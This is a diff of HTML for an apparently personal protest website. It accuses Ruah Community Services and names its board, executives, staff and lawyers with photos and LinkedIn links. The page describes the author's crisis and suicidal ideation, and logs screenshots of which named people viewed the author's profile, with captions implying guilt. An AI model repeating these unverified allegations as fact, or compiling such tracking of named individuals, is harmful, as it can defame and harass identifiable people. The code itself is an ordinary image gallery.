+    <p><strong>“Silence isn’t neutrality. It’s alignment with power.”</strong></p>
+    <p>– Systemic Reflection</p>
+  </blockquote>
+</div>
+
+<!-- Clear float and continue layout -->
+
+<div style="clear: both;"></div>
+
+<p>Chief Financial Officer of Ruah Community Services since 2016.<br>
+Former finance manager at Glasnevin Trust.<br>
+Former senior accountant at <strong>Activ Foundation</strong>.<br>
+Member of Chartered Accountants Australia and New Zealand.<br>
+Fellow of the Association of Chartered Certified Accountants.<br>
+Holder of a BA in Accounting and Finance from Liverpool John Moores University.</p>
+
+<p>He oversees the financial <strong>integrity</strong> of an organization <strong>dedicated</strong> to <strong>supporting</strong> the <strong>most vulnerable</strong>. He <strong>ensures compliance</strong>, allocates resources, and <strong>upholds</strong> the fiscal <strong>responsibility</strong> that underpins <strong>every service Ruah provides</strong>.</p>
+
+<p><strong>His role</strong> is <strong>not merely</strong> numbers on <strong>a ledger</strong>. It is the <strong>backbone of programs</strong> that claim to <strong>offer safety</strong>, <strong>dignity</strong>, and <strong>hope</strong>.</p>
+
+<h1><u><strong>What follows is an examination of how financial decisions, under his stewardship, have impacted real lives.</strong></u></h1>
+
+<p>The funding choices.<br>
+The resource allocations.<br>
+The priorities set.</p>
+
+<p>This is not an abstract analysis.<br>
+<strong>It is a direct look at the consequences of financial governance.</strong></p>
+
+<p style="font-size: 0.8em;">
+  <a href="https://www.linkedin.com/in/rev-k-m-d-b19953b6/" target="_blank" style="color: #88c0d0;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">[MORE TO COME]</a>
+</p><hr>
+
+<!-- GREY END -->
+
+
+
+<!-- END -->
+
+
+
+<!-- Delay Section -->
+                             
+                             
+                             
+<!-- Friday Stalling -->
+
+<h2>📬 Legal Stalling</h2>
+<p>I politely reached out to their legal representative — along with Debra, Elsie, and Graham — earlier in the week. I offered a zero-pressure, no-expectation opportunity to open a quiet handshake negotiation, to be held before close of business Friday, 20 June 2025.</p>
+<p><strong>As of 22nd June 2025 — no reply has been received.</strong></p>
+<p>Ruah does not want a quiet, easy settlement.</p>
+<hr>
+
+<!-- Delay Deb -->
+
+<h2>📄 Official Record of Delays — Documented Responses</h2>
+
+<h3>📬 CEO Response: Delayed Acknowledgment</h3>
+<blockquote>
+  <p><strong>“We will be unable to meet your timeline of today. We will endeavour to provide a response by the end of next week.”</strong><br>
+  — Debra Zanella, CEO, Ruah Community Services</p>
+</blockquote>
+<p><strong>Received:</strong> 6 June 2025</p>
+<p><em>Context:</em> This message was received 7 days after formal notification was sent (29 May 2025). No immediate response, no resolution — only a postponed deadline.</p><hr>
+
+<!-- Delay Elsie -->
+
+<h2>📑 Complaints Procedure Timeline</h2>
+<blockquote>
+  <p><strong>“Please note that this process may take up to 15 working days.”</strong><br>
+  — Elsie Blay, Executive Manager, Services</p>
+</blockquote>
+<p><strong>Received:</strong> 30 May 2025 (now 22nd June 2025, timeframe is now elapsed)</p>
+<p><em>Context:</em> Ruah initiated a slow internal review process while risks remained unaddressed. They allocated themselves three full weeks to respond — despite the urgency already outlined.</p><hr>
+
+<!-- Delay Shan -->
+
+<h3>🔒 Legal Firm Closure Notice</h3>
+<blockquote>
+  <p><strong>“We will not be engaging any further with you in respect of these issues.”</strong><br>
+  — Shannon Mony, Meridian Lawyers (acting for Ruah)</p>
+</blockquote>
+<p><strong>Received:</strong> 13 June 2025</p>
+<p><em>Context:</em> This was issued just 7 days after the CEO promised a response — abruptly ending communication without follow-up.</p>
+<p style="font-size: 0.95em; margin-top: 0.3em;">
+Author of a legal review into suicide-related duty-of-care failures at Alma Street (2016).  
+Now representing Ruah — during a parallel period of unaddressed suicide risk.  
+<span style="font-size: 0.85em; color: #889988;">[PDFs ABOVE]</span>
+</p><hr>
+
+<!-- Harm Section -->
+
+<h2><strong>System Impact Report — Ongoing Harm</strong></h2>
+
+<p><em>This system failure is actively harming me.</em></p>
+
+<p>I am now trapped in an autistic hyperfixation loop that I cannot break until a resolution is reached.</p>
+
+<p>I cannot eat properly.<br>
+I cannot sleep properly.<br>
+Basic hygiene is failing.<br>
+I have run out of essential medication and do not feel safe enough to leave my house to get more.</p>
+
+<p>No support services are available — they are all implicated in the systemic failure.</p>
+
+<p>I am being left to collapse mentally and physically while this corporate system stalls and watches.</p>
+
+<p>This is no longer about the past.<br>
+This is about what is being done to me <strong>right now</strong> — today.</p>
+
+<p><em>The archive remains live. The system is not still.</em></p>
+
+<p><strong>#SharingSilence</strong></p><hr>
+
+
+
+<!-- END -->
+
+
+
+<!-- Board of Directors Section -->
+
+
+
+<style>
+  #board-of-directors a, #ambassadors-executives a {
+    color: #88c0d0 !important;
+    text-decoration: none;
+    transition: color 0.3s ease;
+  }
+
+  #board-of-directors a:hover, #ambassadors-executives a:hover {
+    color: #4da6ff !important;
+    text-decoration: underline;
+  }
+</style>
+
+<!-- Board of Directors Section -->
+
+<section id="board-of-directors" style="margin-top: 2rem; font-family: sans-serif; color: #c3f0c8;">
+  <h2 style="font-size: 1.6em; margin-bottom: 1.5rem;">🏛️ Ruah Community Services — Board of Directors</h2>
+
+<!-- Individual Profiles -->
+
+<div style="display: flex; flex-wrap: wrap; gap: 2rem;">
+
+<!-- Louise Ardagh -->
+
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/wY1QigS.png" alt="Louise Ardagh" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/louise-ardagh-132663/" target="_blank" class="hover-link">Louise Ardagh</a></h3>
+      <p><strong>Chairman</strong><br>BA; Grad Dip Bus, GAICD</p>
+      <p>Extensive experience in strategy and marketing across international and executive roles in banking, insurance, telecoms, and automotive. Former CEO. Known for customer transformation work.</p>
+    </div>
+
+<!-- Monica Juricev -->
+
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/YEW1fpm.png" alt="Monica Juricev" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/monica-juricev-8351a35b/" target="_blank" class="hover-link">Monica Juricev</a></h3>
+      <p>BBus, MBA</p>
+      <p>Consultant with expertise across higher education, public and private sectors. Long-time board contributor in community care, specialising in guiding organisations through change.</p>
+    </div>
+
+<!-- Tony Curry -->
+
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/C8Fh37V.png" alt="Tony Curry" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/tony-curry-14a9993b/" target="_blank" class="hover-link">Tony Curry</a></h3>
+      <p>EdD; MEd; BEd</p>
+      <p>Veteran educator and principal. Now Director of Leadership at Catholic Education WA, bringing decades of experience in regional and metro school systems.</p>
+    </div>
+
+<!-- Sylvia Meier -->
+
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/HOqS6Wt.png" alt="Sylvia Meier" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/sylvia-meier-546691bb/" target="_blank" class="hover-link">Sylvia Meier</a></h3>
+      <p>B App Sc (Psych), GradDip OrgPsych, MBA, GAICD</p>
+      <p>Over 35 years in disability and health leadership. Lecturer at UWA. Currently with WA Country Health Service as Director of Population Health.</p>
+    </div>
+
+<!-- Justine Roberts -->
+
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/u4kXukL.png" alt="Justine Roberts" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/justine-roberts-gaicd-044b354a/" target="_blank" class="hover-link">Justine Roberts</a></h3>
+      <p>BArch (Hons), BEnvDes</p>
+      <p>CEO of Kingston Development. 20+ years in property and construction in WA and the US. Holds multiple advisory roles and committee leaderships.</p>
+    </div>
+
+<!-- Braden Hill -->
+
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/5rJqX5z.png" alt="Braden Hill" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/braden-hill-30311a38/" target="_blank" class="hover-link">Braden Hill</a></h3>
+      <p>B.Ed, BA (Indigenous Studies), M.Res (Indigenous Education)</p>
+      <p>Wardandi man and equity leader at Edith Cowan University. Specialist in Indigenous education and queer identity in learning. Director at Pride Cup.</p>
+    </div>
+
+<!-- Michael Shanahan -->
+
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/oChdzua.png" alt="Michael Shanahan" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/michael-shanahan-04772b2/" target="_blank" class="hover-link">Michael Shanahan</a></h3>
+      <p>MB (Finance)</p>
+      <p>Partner at McGrathNicol. Leads forensic services in Perth. Former ASIC investigator. Specialist in risk, fraud, governance, and financial forensics.</p>
+    </div>
+
+  </div>
+</section>
+
+<style>
+  a.hover-link {
+    color: #88c0d0;
+    text-decoration: none;
+    transition: color 0.3s ease;
+  }
+  a.hover-link:hover {
+    color: #4da6ff;
+  }
+</style><hr>
+
+
+
+<!-- Ambassadors & Executives Section -->
+
+
+
+<!-- CSS for link styling -->
+
+<style> 
+  #board-of-directors a, #ambassadors-executives a {
+    color: #88c0d0 !important;
+    text-decoration: none;
+    transition: color 0.3s ease;
+  }
+
+  #board-of-directors a:hover, #ambassadors-executives a:hover {
+    color: #4da6ff !important;
+    text-decoration: underline;
+  }
+</style>
+
+<section id="ambassadors-executives" style="margin-top: 2rem; font-family: sans-serif; color: #c3f0c8;">
+  <h2 style="font-size: 1.6em; margin-bottom: 1.5rem;">🤝 Ruah Leadership & Ambassadors</h2>
+
+  <div style="display: flex; flex-wrap: wrap; gap: 2rem;">
+
+<!-- Mark Slattery -->
+    
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/9k9zoB3.png" alt="Mark Slattery" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/mark-slattery-21852488/" target="_blank">Mark Slattery</a></h3>
+      <p><strong>Executive Manager, Strategy and Development</strong></p>
+      <p>Over 30 years in health and not-for-profit sectors across Australia and the UK. Former interim CEO at 360 Health. Board Director at ShelterWA, with a focus on client-centred outcomes and quality improvement.</p>
+    </div>
+
+<!-- Carmen Acosta -->
+
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/n1NrHGi.png" alt="Carmen Acosta" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/carmenacosta1/" target="_blank">Carmen Acosta</a></h3>
+      <p><strong>Executive Manager, Legal Services</strong></p>
+      <p>35+ years in private and not-for-profit leadership, spanning disabilities, homelessness, mental health, domestic violence, and legal services across WA. Chair of the Alcohol and Other Drug Consumer and Community Coalition (AODCCC).</p>
+    </div>
+
+<!-- Gail Beck -->
+
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/tK6oJ7p.png" alt="Gail Beck OAM" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/gail-beck-43b52037/" target="_blank">Gail Beck OAM</a></h3>
+      <p><strong>Executive Manager, Cultural Integration</strong></p>
+      <p>Bibbulmun (Nyoongar) woman and decorated Indigenous leader. Founder of several WA Indigenous initiatives. Recipient of OAM (2012), Amnesty Award (2005), and Rotary Award (2004).</p>
+    </div>
+
+<!-- Rabia Siddique -->
+
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/D1XeNsD.png" alt="Rabia Siddique" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/rabiasiddique/" target="_blank">Rabia Siddique</a></h3>
+      <p><strong>Ruah Ambassador</strong></p>
+      <p>Former lawyer in criminal, war crimes, and human rights. Inspirational change agent and advocate for justice and equity. Prominent face of the RCWC campaign.</p>
+    </div>
+
+<!-- Duc Pham -->
+    
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/vuR7Qzq.png" alt="Duc Pham" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/duc-pham-8300204b/" target="_blank">Duc Pham</a></h3>
+      <p><strong>Ruah Ambassador</strong></p>
+      <p>Founder of Premier Business Network. Drives corporate support and awareness for homelessness and domestic violence services, using entrepreneurial outreach to support RCWC fundraising.</p>
+    </div>
+
+<!-- Dr Sandy Chong -->
+
+    <div style="flex: 1 1 300px;">
+      <img src="https://i.imgur.com/68LpzbR.png" alt="Dr Sandy Chong" style="width: 100%; max-width: 135px; float: left; margin-right: 1rem; border-radius: 8px; box-shadow: 0 0 8px rgba(0,0,0,0.2);">
+      <h3><a href="https://www.linkedin.com/in/sandychong/" target="_blank">Dr Sandy Chong</a></h3>
+      <p><strong>Ruah Ambassador</strong></p>
+      <p>Global advocate for education and economic empowerment. United Nations SDG promoter. Her work champions gender equity, domestic violence support, and youth advancement.</p>
+    </div>
+
+  </div>
+</section><hr>
+
+
+
+<!-- END -->
+
+
+
+<!-- Before the silence section  -->
+
+
+
+<!-- Email 7th may -->
+
+
+
+ <div style="margin: 2rem auto; text-align: center;"><h1><strong><b>Before The Silence</b></strong></h1><br>
+  <img src="https://i.imgur.com/njYiEtu.jpeg" alt="Shannon Mony LinkedIn viewed Sharing Silence profile" style="width: 50vw; max-width: 250px; display: block; margin: 0 auto; border: 1px solid #444; border-radius: 8px;" />
+  <p style="margin-top: 2rem; font-size: 0.95em; text-align: left; color: #c3f0c8; line-height: 1.6; font-family: sans-serif;">
+    The first documented recontact with Ruah occurred on <strong>7 May 2025 at 12:23 PM</strong>, via a formal referral to the Stronger Ground program. An auto-response was received confirming receipt and promising follow-up within 24 hours.<br><br>
+What followed was a series of delays and unprofessional behaviour from 
+    <a href="https://au.linkedin.com/in/sheila-jay-3a96b6103" target="_blank" style="color: #88c0d0; text-decoration: none;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">Sheila Jay</a>. 
+    I attempted to escalate concerns, but she refused.<br>
+
+    Eventually, I was handed over to 
+    <a href="https://www.linkedin.com/in/nina-anderson-a5228b18a/" target="_blank" style="color: #88c0d0; text-decoration: none;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">Nina Anderson</a> 
+    and 
+    <a href="https://www.linkedin.com/in/jodie-harding-161937222/" target="_blank" style="color: #88c0d0; text-decoration: none;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">Jodie Harding</a>. 
+    We had an in-person meeting. During that meeting, I was coerced into agreeing with things that weren’t true — not maliciously, but due to Jodie’s lack of trauma-informed training. I do not believe it was her fault.<br>
+Afterwards, I was drawn into a disorganised email chain that triggered a meltdown. I asked repeatedly for clarity — just basic updates — and was instead told by Nina to “stop.” What I needed, and clearly stated, was regular communication to avoid being retraumatised after years of abandonment. I did not receive it.<br><br>
+
+    I expressed — in writing — that the treatment I was receiving was pushing me into suicidal ideation. I was left in that state for over 12 hours. Eventually, the next day, a welfare check was called. By then, I was completely shut down, isolated, and too afraid to leave my home.<br>
+
+    That is when I realised: they had been given ample opportunity to do the right thing — and didn’t. That’s when I chose legal action. Not out of anger, but to force accountability. To secure restitution.
+  </p>
+</div>
+
+<!-- Final outreach -->
+
+  <p><em><h2><strong>(Sent to Ruah — Final Outreach, 29th May 2025)</h2></strong></em></p>
+
+
+  <p>I don’t know who’s reading this.<br>
+  Maybe we’ve never met.<br>
+  Maybe you’re staff.<br>
+  Maybe you’re admin, management — or just someone who got CC’d.</p>
+
+  <p>You didn’t ask for this.<br>
+  But now you have it.<br>
+  And I need you to hear me.</p>
+
+  <p>I’m autistic.<br>
+  My mind is sharp — until I’m overwhelmed.<br>
+  Then everything collapses.<br>
+  I go non-verbal.<br>
+  My speech shuts down.<br>
+  My body freezes.<br>
+  People think I don’t understand.<br>
+  But I do.<br>
+  I just can’t get the words out when I need them most.<br>
+  And I remember everything.</p>
+
+
+
+<p style="color: #B7D1B0; font-size: 1.2em; font-weight: bold;">Ten years ago, Ruah assigned me a support worker. Her name was Mary.</p>
+
+
+
+  <p>She stabilised my life.<br>
+  I started therapy.<br>
+  I got my children back.<br>
+  Supervised visits became overnights.<br>
+  My world was coming back together.</p>
+
+  <p>Then — Mary left.<br>
+  No warning. No transition. No handover.<br>
+  Just gone.</p>
+
+  <p>And everything fell apart.</p>
+
+
+
+  <p>The NDIS changed.<br>
+  My funding stayed — but my supports vanished.<br>
+  A provider entered my home. They touched my things. They left.<br>
+  The money disappeared.</p>
+
+  <p>I reported it. Nothing happened.<br>
+  Another provider came.<br>
+  They never returned. I still don’t know why.<br>
+  Calls followed. Cold. Pressuring. Overwhelming.<br>
+  There was no continuity. No care.<br>
+  I didn’t know who these people were.<br>
+  I still don’t.</p>
+
+  <p>My GP left.<br>
+  I relapsed. First on opioids. Then on alcohol.<br>
+  My mother became terminal. I became her carer.<br>
+  Then she died.</p>
+
+  <p>If anyone from Ruah reached out — I don’t remember.<br>
+  If they did, it didn’t hold.</p>
+
+  <p>Because what I needed was someone who wouldn’t vanish when I couldn’t speak.<br>
+  Someone who understood what <strong>real crisis</strong> looks like.<br>
+  And in that darkness — I lost my children again.</p>
+
+
+
+  <p>Not by court.<br>
+  Not by choice.<br>
+  But by silence.</p>
+
+  <p>Ten years ago, we had a court-ordered agreement.<br>
+  I followed it. Every step. Every condition.<br>
+  My children were back in my life.</p>
+
+  <p>Then I lost my support.<br>
+  Then my ex moved. Cut contact.<br>
+  And I didn’t have the strength, the knowledge, or the backing to fight it.</p>
+
+  <p>I didn’t disappear.<br>
+  I was erased.</p>
+
+
+
+  <p>Now they grow up believing I walked away.<br>
+  That I gave up.<br>
+  That I didn’t care.</p>
+
+  <p>But I didn’t.<br>
+  I was alone.<br>
+  And no system — not one — stepped in to pull me back.</p>
+
+  <p>I missed birthdays.<br>
+  I missed years.<br>
+  And I will never get that time back.<br>
+  And neither will they.</p>
+
+  
+
+  <p>You say you protect the vulnerable.<br>
+  But when I became one again — you weren’t there.</p>
+
+  <p>You had the records.<br>
+  The notes.<br>
+  The risk flags.<br>
+  You saw it.<br>
+  You knew.</p>
+
+  <p>And you did nothing.</p>
+
+  
+
+  <p>I’m not writing this to shame you.<br>
+  I’m writing this because <strong>you need to understand what silence costs.</strong></p>
+
+  <p>And now, if you’ve read this far — <strong>you’re holding it too.</strong></p>
+
+  <p>Because this letter didn’t land in one inbox.<br>
+  It’s being read.<br>
+  Right now.<br>
+  In offices. In meetings.<br>
+  Between emails. Between shifts.<br>
+  Quietly. Carefully.</p>
+
+  <p>Someone is already rereading it.<br>
+  Someone is already wondering what this means.<br>
+  Maybe even asking questions.</p>
+
+  <p>I don’t know what this letter will do.<br>
+  Maybe nothing.<br>
+  Maybe something.</p>
+
+  <p>But whatever happens next — <strong>even if it’s silence again — it will say something.</strong></p>
+
+  <p>About you.<br>
+  About this system.<br>
+  About all of us.</p>
+
+  
+
+  <p style="font-style: italic;">I’m Kev.<br>
+  I’ve carried this alone for too long.<br>
+  And I don’t know what’s left of me.</p>
+
+<p style="font-size: 0.75em; color: #aaaaaa; margin-top: 1.5em;"><em><strong>Please.</strong></em></p>
+
+</section><hr>
+
+
+
+<!-- END -->
+
+
+
+<!-- Esculations section  -->
+
+
+
+<!-- Intinmidation  -->
+
+<br><h2><strong><u>Recent Escalations — Intimidation and Unsafe Environment</strong></u></h2><br>
+
+<p><blockquote><h3><strong>"Scheduling will be in touch to schedule a time for a home visit. Two staff will be in attendance. I will bring the relevant documents for your signature."</strong></h3></p>
+
+<p>- <a href="https://au.linkedin.com/in/sheila-jay-3a96b6103" target="_blank" style="color: #88c0d0; text-decoration: none;" onmouseover="this.style.color='#4da6ff'" onmouseout="this.style.color='#88c0d0'">Sheila Jay</a>. </blockquote> <br> I
+Initial Ruah contact, after several meltdowns had already occurred. This message led to feeling intensely intimidated — as if my home was about to be invaded and I would be forced to sign legal documents under duress.</p>
+
+<blockquote>
+  <p><h3><strong>"Meet at the café for this appointment. We can then discuss the location of any potential future appointments after the initial assessment.</strong></h3>"</p>
+  <p>
+    — Rachael (Ruah Scheduling).</blockquote><br>
+Following Sheila’s handover.  
+    This clearly indicates that first appointments are ordinarily conducted in neutral public settings — not via unrequested home visits.  
+    The contrast highlights that Sheila’s insistence on an initial home attendance was abnormal and, in this context, deeply intimidating.
+  </p>
+
+
+<p>For weeks now, I have been left feeling unsafe in my own home.</p>
+
+<p><strong>Since that point, the following has occurred:</p>
+
+<ul>
+<li>Police have been called to my home to try to remove me.</li>
+<li>An Alma St crisis team has been called to try to remove me from my home.</li>
+<li>Multiple calls from Alma St trying to pressure me into hospital admission.</li>
+<li>Numerous phone calls from housing connected to this case.</li>
+<li>Unexpected knocks from 'official' looking individuals at my door — at unpredictable times — causing acute distress.</li>
+<li>Someone is attempting to contact my GP.</li>
+<li>Someone is attempting to contact housing.</li>
+</ul>
+
+<p>Noone has permission to contact these places on my behalf.</strong></p>
+
+<p>I no longer feel safe to leave my home — or even to answer my door.</p>
+
+<p>I do not know who is contacting these parties — but it is not me.</p>
+
+<p>My home is my only safe space — and I am now being left to feel that it is under threat of invasion and coercion.</p>
+
+<p><h3><strong>This is an unacceptable escalation — and is compounding the direct harm already being caused.</strong></h3></p><hr>
+
+
+
+<!-- PICS SECTION -->
+
+
+
+<!-- HEADING -->
+
+<section style="margin-top: 2rem;padding: 2rem; font-family: sans-serif;">
+  <h2 style="font-size: 2em; margin-bottom: 0.5em; border-bottom: 2px solid #444; padding-bottom: 0.3em;">
+    They Followed the Silence
+  </h2>
+
+  <p style="margin-bottom: 2rem; font-size: 1.1em;">
+    The individuals shown below are publicly affiliated with Ruah Community Services — as ambassadors, board supporters, or figures within their outer influence network.<br/>
+    Each either viewed the author’s profile or accepted a direct connection during the active publication of this public record.<br/><br/>
+    These are not accusations. These are digital footprints. They looked. They connected. They knew.
+  </p>
+
+<!-- LIGHTBOX -->
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    .gallery {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 1rem;
+    }
+
+    .gallery-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 150px;
+    }
+
+    .thumbnail {
+      width: 100%;
+      aspect-ratio: 1/1;
+      object-fit: cover;
+      border: 1px solid #444;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: transform 0.2s ease;
+    }
+
+    .thumbnail:hover {
+      transform: scale(1.05);
+    }
+
+    .caption {
+      margin-top: 0.5rem;
+      font-size: 0.75rem;
+      text-align: center;
+      color: #7FCF7F;
+      line-height: 1.3;
+    }
+
+    .lightbox-overlay {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .lightbox-overlay img {
+      max-width: 90%;
+      max-height: 90%;
+      border-radius: 10px;
+    }
+
+    @media (max-width: 600px) {
+      .gallery-item {
+        width: 45%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div style="margin-left: 0;">
+  <div class="gallery" id="gallery" style="max-width: 1000px;"></div>
+</div>
+    <div class="gallery" id="gallery" style="max-width: 1000px;"></div>
+  </div>
+
+  <div id="lightbox" class="lightbox-overlay" onclick="closeLightbox()">
+    <img id="lightbox-img" src="" alt="Expanded view" />
+  </div>
+
+  <script>
+    const images = [
+      // your image links + captions go here as [url, caption] pairs
+["https://i.imgur.com/igbOGgm.jpeg", "Screenshot showing Rabia viewing Sharing Silence site on LinkedIn"],
+  ["https://i.imgur.com/10G2a15.jpeg", "Pham & Chong LinkedIn profile view logged"],
+  ["https://i.imgur.com/kok1Ypz.jpeg", "Lesley connection confirmed on Sharing Silence trace"],
+  ["https://i.imgur.com/blfQF1p.jpeg", "Sneak view on 30 May — internal IP"],
+  ["https://i.imgur.com/7PWJqf5.jpeg", "Sneak view on 14 June — early pattern detection"],
+  ["https://i.imgur.com/qZDy0Kh.jpeg", "Searching LinkedIn internally — staff behaviour trace"],
+  ["https://i.imgur.com/nqxeSZd.jpeg", "Carrd trail click confirmation — internal referral"],
+  ["https://i.imgur.com/cm1ArVp.jpeg", "Meridian lawyer connection trace screenshot"],
+  ["https://i.imgur.com/URlQNdk.jpeg", "Public views log analytics capture"],
+  ["https://i.imgur.com/8qTCuQ5.jpeg", "Google Analytics spike during pressure campaign"],
+  ["https://i.imgur.com/4WJXiWk.jpeg", "7am peak — internal viewing time trace"],
+  ["https://i.imgur.com/uxRNdl6.jpeg", "Desktop switch detected at 8am — operational footprint"],
+  ["https://i.imgur.com/xakqSGJ.jpeg", "Perth to Albany route metadata capture"],
+  ["https://i.imgur.com/SO7yH7N.jpeg", "XYZ site traffic surge confirmed"],
+  ["https://i.imgur.com/R5bLNIq.png", "VPN usage pattern — internal cover attempt?"],
+  ["https://i.imgur.com/MPOt5OK.jpeg", "Noon surge — campaign effect ripple starts"],
+  ["https://i.imgur.com/5A1XKZR.jpeg", "Carrd page use ongoing despite removal"],
+  ["https://i.imgur.com/xM0x1eU.jpeg", "Cache miss pattern confirmed — traceable"],
+  ["https://i.imgur.com/23ORi60.jpeg", "Refresh triggered during internal review"],
+  ["https://i.imgur.com/VosPpNj.jpeg", "Carrd page reloaded internally"],
+  ["https://i.imgur.com/ex8Fyu7.jpeg", "Carrd trail (Revisited) — pressure re-applied"],
+  ["https://i.imgur.com/8lqWjlJ.jpeg", "Sheila blocked — metadata capture"],
+  ["https://i.imgur.com/GwrNzyM.jpeg", "Ongoing Carrd trail looped internally"],
+  ["https://i.imgur.com/2FBwX3e.jpeg", "Two internal Ruah workers viewed content"],
+  ["https://i.imgur.com/D929PoP.jpeg", "Peer connection trace — internal handover?"],
+  ["https://i.imgur.com/b1AXoiq.jpeg", "LinkedIn view growth post-content drop"],
+  ["https://i.imgur.com/eYaPivY.jpeg", "Ranii returns to review site metadata"],
+  ["https://i.imgur.com/SXYp0xn.png", "Scrub process started — trace of removal"],
+  ["https://i.imgur.com/HfsoABY.png", "Scrub confirmed — metadata removed or renamed"],
+  ["https://i.imgur.com/ZXU4gdj.jpeg", "10:49am cache hit — proof of live revisit"],
+  ["https://i.imgur.com/ojUwbil.jpeg", "Duc blocks account — internal shutdown trace"],
+  ["https://i.imgur.com/KHRDmQc.jpeg", "Still shared — site ping on 18 June"],
+  ["https://i.imgur.com/bK1RrrS.jpeg", "Rabia: Humanitarian or optical gesture? [1]"],
+  ["https://i.imgur.com/bK1RrrS.jpeg", "Rabia: Humanitarian or optical gesture? [2]"],
+  ["https://i.imgur.com/kci6vYB.jpeg", "Rabia: Humanitarian or optical gesture? [3]"],
+  ["https://i.imgur.com/MmOiBIT.jpeg", "Rabia: Humanitarian or optical gesture? [4]"],
+  ["https://i.imgur.com/2FojjqR.jpeg", "Rabia: Humanitarian or optical gesture? [5]"],
+  ["https://i.imgur.com/vRXYbT3.jpeg", "Rabia: Humanitarian or optical gesture? [6]"],
+  ["https://i.imgur.com/2x5RnB5.jpeg", "Rabia — optics over aid?"]
     ];
 
-    // Pick a random title each time
-    document.getElementById("binaryTitle").innerText = binaryTitles[Math.floor(Math.random() * binaryTitles.length)];
+    const gallery = document.getElementById("gallery");
+    images.forEach(([src, alt]) => {
+      const wrapper = document.createElement("div");
+      wrapper.className = "gallery-item";
+      wrapper.innerHTML = `
+        <img src="${src}" class="thumbnail" alt="${alt}" onclick="openLightbox('${src}', '${alt.replace(/'/g, "\\'")}')">
+        <div class="caption">${alt}</div>
+      `;
+      gallery.appendChild(wrapper);
+    });
 
-    // 50% chance to play hum
-    if (Math.random() < 0.5) {
-      const hum = document.getElementById("hum");
-      hum.volume = 0.2;
-      hum.play().catch(() => console.warn("Autoplay blocked"));
+    function openLightbox(src, alt) {
+      const lightboxImg = document.getElementById('lightbox-img');
+      lightboxImg.src = src;
+      lightboxImg.alt = alt;
+      document.getElementById('lightbox').style.display = 'flex';
     }
 
-    // 50% chance to show ghost image
-    if (Math.random() < 0.5) {
-      const ghost = document.createElement("div");
-      ghost.className = "ghost-bg";
-      document.getElementById("ghostContainer").appendChild(ghost);
+    function closeLightbox() {
+      document.getElementById('lightbox').style.display = 'none';
+      const lightboxImg = document.getElementById('lightbox-img');
+      lightboxImg.src = "";
+      lightboxImg.alt = "";
     }
   </script>
+
 </body>
 </html>
+
+<!-- END LIGHTBOX -->
+
+  <h2>🧩 Internal Link Trail Confirmed</h2>
+  <p>
+    Even after the public link to this site was removed from the Carrd page, traffic continued arriving via 
+    <code>sharingsilence.carrd.co</code>.
+  </p>
+  <p>This proves:</p>
+  <ul>
+    <li>Internal staff had the Carrd link <strong>bookmarked or archived</strong></li>
